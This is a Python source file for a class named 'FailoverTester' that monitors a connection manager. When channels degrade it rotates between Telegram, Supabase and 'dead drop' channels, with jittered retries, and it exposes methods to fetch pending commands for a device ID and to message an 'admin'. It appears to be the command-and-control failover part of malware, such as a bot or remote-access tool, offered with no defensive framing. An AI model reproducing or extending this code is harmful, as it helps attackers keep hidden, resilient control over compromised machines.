#!/usr/bin/env python3
import time
import logging
import threading
import random

class FailoverTester:
    def __init__(self,cm):
        self.cm=cm
        self.a=True
        self.ci=300
        self.fc=0
        self.l=threading.Lock()
    def start_periodic_check(self,iv=300):
        self.ci=iv
        def _c():
            while self.a:
                try:
                    s=self.cm.check_all_connections()
                    logging.info(f"st:{s}")
                    if not any(s.values()):
                        logging.critical("all dead!")
                        self._ef()
                    elif sum(1 for v in s.values() if v)<len(s)//2:
                        logging.warning("degraded, rotate")
                        with self.l:
                            self.fc+=1
                            if self.fc>3:
                                self.cm.rotate_telegram()
                                self.cm.rotate_supabase()
                                self.cm.rotate_dead_drop()
                                self.fc=0
                except Exception as e:
                    logging.error(f"chk err {e}")
                time.sleep(self.ci)
        threading.Thread(target=_c,daemon=True).start()
    def _ef(self):
        for i in range(10):
            dd=self.cm.get_active_dead_drop()
            if dd:
                logging.info(f"try dd {dd}")
                if self.cm.test_url(dd):
                    logging.info("dd ok, reset")
                    with self.l:
                        self.cm.rotate_telegram()
                        self.cm.rotate_supabase()
                        self.cm.rotate_dead_drop()
                        self.fc=0
                    return
            time.sleep(60*random.uniform(0.5,1.5))
        logging.critical("no fallback")
    def fetch_pending_commands(self,did,sc=None):
        return self.cm.fetch_pending_commands(did,sc)
    def send_message_to_admin(self,t):
        return self.cm.send_message_to_admin(t)